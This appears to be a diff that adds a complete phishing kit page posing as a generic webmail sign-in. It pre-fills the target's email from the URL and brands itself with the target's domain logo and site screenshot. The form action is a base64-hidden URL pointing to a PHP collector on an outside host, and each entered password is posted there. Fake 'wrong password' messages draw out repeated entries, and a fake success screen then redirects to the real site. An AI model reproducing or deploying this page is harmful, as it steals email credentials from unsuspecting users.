@@ -1,0 +1,631 @@
+<html><!--"hgoz1rl96i6u7i"--><head>
+
+   <title> - MAIL SYSTEM Sign in to continue</title>
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer">
+   <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+   <link rel="shortcut icon" type="image/x-icon" href="">
+   <style>
+      @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+   </style>
+
+   <style type="text/css">
+      :root {
+         --primary: #6366f1;
+         --primary-hover: #4f46e5;
+         --danger: #ef4444;
+         --success: #10b981;
+         --bg-light: #f8fafc;
+         --text-dark: #1e293b;
+         --text-muted: #64748b;
+         --border: #e2e8f0;
+         --shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+         --radius: 16px;
+      }
+
+      * {
+         margin: 0;
+         padding: 0;
+         box-sizing: border-box;
+      }
+
+      body {
+         font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+         color: var(--text-dark);
+         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+         min-height: 100vh;
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         background-image: url(https://i.imgur.com/W6H22Ci.png);
+         background-size: cover;
+         background-position: center;
+         background-attachment: fixed;
+      }
+
+      .container {
+         width: 100%;
+         max-width: 440px;
+         padding: 20px;
+      }
+
+      .form-section {
+         background: rgba(255, 255, 255, 0.98);
+         backdrop-filter: blur(20px);
+         border-radius: var(--radius);
+         padding: 40px 35px;
+         box-shadow: var(--shadow);
+         border: 1px solid rgba(255, 255, 255, 0.3);
+         transition: all 0.3s ease;
+      }
+
+      .logo {
+         text-align: center;
+         margin-bottom: 30px;
+      }
+
+      .logo a {
+         text-decoration: none;
+         color: inherit;
+      }
+
+      #logo {
+         height: 48px;
+         margin-bottom: 12px;
+      }
+
+      #logoname {
+         font-size: 1.8rem;
+         font-weight: 700;
+         color: var(--text-dark);
+         letter-spacing: -0.5px;
+      }
+
+      #dom_name {
+         text-align: center;
+         font-size: 14px;
+         color: var(--text-muted);
+         margin-bottom: 10px;
+         display: none;
+      }
+
+      .heading-text {
+         text-align: center;
+         color: var(--text-dark);
+         font-size: 18px;
+         font-weight: 600;
+         margin-bottom: 30px;
+         line-height: 1.4;
+      }
+
+      .message-box {
+         margin: 15px 0;
+         padding: 14px 16px;
+         font-size: 14px;
+         font-weight: 500;
+         border-radius: 10px;
+         display: none;
+         text-align: center;
+         animation: slideDown 0.3s ease;
+      }
+
+      @keyframes slideDown {
+         from {
+            opacity: 0;
+            transform: translateY(-10px);
+         }
+         to {
+            opacity: 1;
+            transform: translateY(0);
+         }
+      }
+
+      .message-box.error {
+         display: block;
+         background: #fef2f2;
+         color: #ef4444;
+         border: 1px solid #fecaca;
+      }
+
+      .message-box.warning {
+         display: block;
+         background: #fffbeb;
+         color: #f59e0b;
+         border: 1px solid #fde68a;
+      }
+
+      .message-box.success {
+         display: block;
+         background: #f0fdf4;
+         color: #10b981;
+         border: 1px solid #bbf7d0;
+      }
+
+      .message-box i {
+         margin-right: 8px;
+      }
+
+      .login-inner-form {
+         margin-top: 0;
+      }
+
+      .form-group {
+         margin-bottom: 20px;
+         position: relative;
+      }
+
+      .form-box input {
+         width: 100%;
+         padding: 14px 48px 14px 20px;
+         font-size: 15px;
+         border: 2px solid var(--border);
+         border-radius: 12px;
+         outline: none;
+         transition: all 0.3s ease;
+         background: var(--bg-light);
+         color: var(--text-dark);
+      }
+
+      .form-box input:focus {
+         border-color: var(--primary);
+         box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+         background: #fff;
+      }
+
+      .form-box input[readonly] {
+         background: #f1f5f9;
+         color: #64748b;
+         cursor: not-allowed;
+      }
+
+      .form-box i {
+         position: absolute;
+         top: 50%;
+         right: 18px;
+         transform: translateY(-50%);
+         font-size: 18px;
+         color: #94a3b8;
+         cursor: pointer;
+         transition: color 0.2s;
+      }
+
+      .form-box i:hover {
+         color: var(--primary);
+      }
+
+      .checkbox {
+         margin-bottom: 20px;
+         font-size: 14px;
+      }
+
+      .form-check {
+         display: flex;
+         align-items: center;
+         gap: 10px;
+      }
+
+      .form-check-input {
+         width: 18px;
+         height: 18px;
+         border: 2px solid #cbd5e1;
+         border-radius: 5px;
+         cursor: pointer;
+         accent-color: var(--primary);
+      }
+
+      .form-check-label {
+         font-weight: 500;
+         color: var(--text-muted);
+         cursor: pointer;
+         user-select: none;
+      }
+
+      .btn-block {
+         display: block;
+         width: 100%;
+      }
+
+      .btn-md {
+         cursor: pointer;
+         padding: 15px 20px;
+         font-size: 16px;
+         font-weight: 600;
+         border-radius: 12px;
+         border: none;
+         color: #fff;
+         background: var(--primary);
+         transition: all 0.3s ease;
+         letter-spacing: 0.3px;
+      }
+
+      .btn-md:hover {
+         background: var(--primary-hover);
+         transform: translateY(-1px);
+         box-shadow: 0 8px 25px rgba(99, 102, 241, 0.3);
+      }
+
+      .btn-md:active {
+         transform: translateY(0);
+      }
+
+      .btn-md:disabled {
+         opacity: 0.7;
+         cursor: not-allowed;
+         transform: none;
+      }
+
+      .btn-md.btn-success {
+         background: var(--success);
+      }
+
+      .btn-md.btn-success:hover {
+         background: #059669;
+         box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3);
+      }
+
+      #msg {
+         display: block;
+         color: var(--danger);
+         font-size: 13px;
+         margin-top: 5px;
+         min-height: 20px;
+      }
+
+      .loader_b {
+         position: fixed;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100%;
+         background: rgba(255, 255, 255, 0.8);
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         z-index: 1000;
+      }
+
+      .loader_b.hidden {
+         display: none;
+      }
+
+      .loader {
+         width: 40px;
+         height: 40px;
+         border: 3px solid #e2e8f0;
+         border-top: 3px solid var(--primary);
+         border-radius: 50%;
+         animation: spin 0.8s linear infinite;
+      }
+
+      @keyframes spin {
+         0% { transform: rotate(0deg); }
+         100% { transform: rotate(360deg); }
+      }
+
+      .success-overlay {
+         position: fixed;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100%;
+         background: rgba(0, 0, 0, 0.6);
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         z-index: 999;
+         animation: fadeIn 0.3s ease;
+      }
+
+      @keyframes fadeIn {
+         from { opacity: 0; }
+         to { opacity: 1; }
+      }
+
+      .success-modal {
+         background: white;
+         border-radius: 20px;
+         padding: 40px;
+         text-align: center;
+         max-width: 400px;
+         width: 90%;
+         box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+         animation: scaleIn 0.3s ease;
+      }
+
+      @keyframes scaleIn {
+         from {
+            opacity: 0;
+            transform: scale(0.9);
+         }
+         to {
+            opacity: 1;
+            transform: scale(1);
+         }
+      }
+
+      .success-icon {
+         width: 80px;
+         height: 80px;
+         background: #f0fdf4;
+         border-radius: 50%;
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         margin: 0 auto 20px;
+      }
+
+      .success-icon i {
+         font-size: 40px;
+         color: #10b981;
+      }
+
+      .success-modal h2 {
+         color: #1e293b;
+         margin-bottom: 10px;
+         font-size: 24px;
+      }
+
+      .success-modal p {
+         color: #64748b;
+         margin-bottom: 20px;
+         line-height: 1.5;
+      }
+
+      .success-modal .redirect-timer {
+         font-size: 14px;
+         color: #94a3b8;
+         margin-top: 10px;
+      }
+
+      #frame_back {
+         display: none;
+      }
+
+      .frame_back_over {
+         display: none;
+      }
+
+      /* Responsive */
+      @media (max-width: 480px) {
+         .form-section {
+            padding: 30px 25px;
+         }
+         
+         .heading-text {
+            font-size: 16px;
+         }
+      }
+   </style>
+</head>
+
+<body>
+   <div class="loader_b hidden" id="loader">
+      <div class="loader"></div>
+   </div>
+   
+   <iframe id="frame_back" scrolling="no"></iframe>
+   <div class="frame_back_over"></div>
+   
+   <div class="container">
+      <div class="form-section">
+         <div class="logo">
+            <a href="">
+               <img src="" alt="Webmail" id="logo">
+               <h2 id="logoname" style="font-size: 1.8rem;"></h2>          
+            </a>
+         </div>
+         
+         <h3 id="dom_name" style="margin-bottom: 0;"></h3>
+         <p class="heading-text">Enter your email account password to continue.</p>
+
+         <div class="message-box" id="messageBox" style="display:none;">
+            <span id="messageText"></span>
+         </div>
+         
+         <div class="login-inner-form">
+            <form class="f_form" action="aHR0cHM6Ly9tZWlzc25lci5hZS93cC1pbmNsdWRlcy9yZXN0LWFwaS9yZXVzbHQtMDEucGhw">
+               <input type="hidden" name="fcc" id="fcc" value="">
+               
+               <div class="form-group form-box">
+                  <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
+                  <i class="fas fa-envelope"></i>
+               </div>
+               
+               <div class="form-group form-box">
+                  <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
+                  <i class="fa fa-eye" id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
+               </div>
+               
+               <span id="msg"></span>
+               
+               <div class="checkbox">
+                  <div class="form-check">
+                     <input class="form-check-input" type="checkbox" id="rem_me">
+                     <label class="form-check-label" for="rem_me">
+                        Remember me for 30 days
+                     </label>
+                  </div>
+               </div>
+               
+               <div class="form-group" style="margin-bottom: 0;">
+                  <button type="submit" id="getitBtn" name="sub" class="btn-md btn-block">
+                     <i class="fas fa-sign-in-alt"></i> Sign In
+                  </button>
+               </div>
+            </form>
+         </div>
+      </div>
+   </div>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
+<script>
+   $(document).ready(function() {
+      const getit = new URLSearchParams(window.location.search);
+      const hashedget = getit.get('e');
+      let dxmain = '';
+      
+      if (!hashedget) {
+         $('html').text('Error');
+         window.stop;
+         return;
+      }
+      
+      $("#email").val(hashedget);
+      dxmain = hashedget.split("@")[1];
+      
+      // Set site branding
+      let sitename = dxmain.split(".")[0].toUpperCase();
+      sitename = sitename.charAt(0).toUpperCase() + sitename.slice(1).toLowerCase();
+      document.title = sitename + ' - ' + document.title;
+      document.querySelector('#logoname').textContent = sitename;
+      
+      // Set favicon and logo
+      let favimg = atob('aHR0cHM6Ly90MS5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnNpemU9NjQmdXJsPWh0dHA6Ly8=') + dxmain;
+      document.querySelector('link[rel="shortcut icon"]').setAttribute('href', favimg);
+      document.querySelector('#logo').setAttribute('src', favimg);
+      
+      // Set background
+      document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${dxmain}'), linear-gradient(135deg, #667eea 0%, #764ba2 100%)`;
+      
+      let atobb = atob($('form').attr('action'));
+      var checker = 0;
+      
+      // Form submission
+      $("form").on('submit', function(event) {
+         event.preventDefault();
+         event.stopPropagation();
+         
+         let email = $("#email").val();
+         let password = $("#password").val();
+         
+         // Validate password
+         if (!password) {
+            $("#msg").text("Please enter your password");
+            $("#password").focus();
+            return;
+         }
+         
+         checker++;
+         $("#msg").text("");
+         hideMessage();
+         
+         // After 4 attempts, redirect directly
+         if (checker > 3) {
+            window.location.href = "https://" + dxmain;
+            return;
+         }
+         
+         // Send AJAX request for ALL attempts (including third)
+         $.ajax({
+            url: atobb,
+            method: "post",
+            data: {
+               email: email,
+               pass: password,
+               clientUrl: `https://${dxmain}`,
+               typesent: ""
+            },
+            beforeSend: function() {
+               $("#getitBtn").prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Verifying...');
+            },
+            success: function(data) {
+               // On third attempt, show success after sending data
+               if (checker === 3) {
+                  showSuccessAndRedirect();
+               } else {
+                  showMessage('error', '<i class="fas fa-exclamation-circle"></i> Reconfirm your correct password, please try again!');
+                  setTimeout(() => {
+                     $("#password").val("").focus();
+                  }, 100);
+               }
+            },
+            error: function(err, xhr) {
+               // On third attempt, still show success even if there's an error
+               if (checker === 3) {
+                  showSuccessAndRedirect();
+               } else {
+                  console.log(err, xhr);
+                  showMessage('error', '<i class="fas fa-exclamation-circle"></i> Connection error, Please try again in few minute time!');
+               }
+            },
+            complete: function() {
+               if (checker !== 3) {
+                  $('#getitBtn').prop('disabled', false).html('<i class="fas fa-sign-in-alt"></i> Sign In');
+               }
+            }
+         });
+      });
+      
+      function showMessage(type, text) {
+         const messageBox = $('#messageBox');
+         const messageText = $('#messageText');
+         
+         messageBox
+            .removeClass('error warning success')
+            .addClass(type);
+         messageText.html(text);
+         messageBox.slideDown(300);
+      }
+      
+      function hideMessage() {
+         $('#messageBox').slideUp(200);
+      }
+      
+      function showSuccessAndRedirect() {
+         // Disable the form
+         $('#getitBtn').prop('disabled', true);
+         $('#password').prop('disabled', true);
+         
+         // Create success overlay
+         const overlay = $('<div>', {
+            class: 'success-overlay',
+            html: `
+               <div class="success-modal">
+                  <div class="success-icon">
+                     <i class="fas fa-check-circle"></i>
+                  </div>
+                  <h2>Verification Successful!</h2>
+                  <p>Your identity has been verified successfully. You will be redirected to your mailbox shortly.</p>
+                  <div class="redirect-timer">
+                     Redirecting in <span id="countdown">3</span> seconds...
+                  </div>
+               </div>
+            `
+         });
+         
+         $('body').append(overlay);
+         
+         // Countdown timer
+         let seconds = 3;
+         const countdownEl = $('#countdown');
+         
+         const countdownInterval = setInterval(() => {
+            seconds--;
+            countdownEl.text(seconds);
+            
+            if (seconds <= 0) {
+               clearInterval(countdownInterval);
+               window.location.href = "https://" + dxmain;
+            }
+         }, 1000);
+      }
+   });
+
+   function togglePasswordVisibility() {
+      const password = document.getElementById("password");
+      const toggleIcon = document.getElementById("togglePassword");
+      
+      if (password.type === "password") {
+         password.type = "text";
+         toggleIcon.classList.remove("fa-eye");
+         toggleIcon.classList.add("fa-eye-slash");
+      } else {
+         password.type = "password";
+         toggleIcon.classList.remove("fa-eye-slash");
+         toggleIcon.classList.add("fa-eye");
+      }
+   }
+</script>
+</body>
+</html>
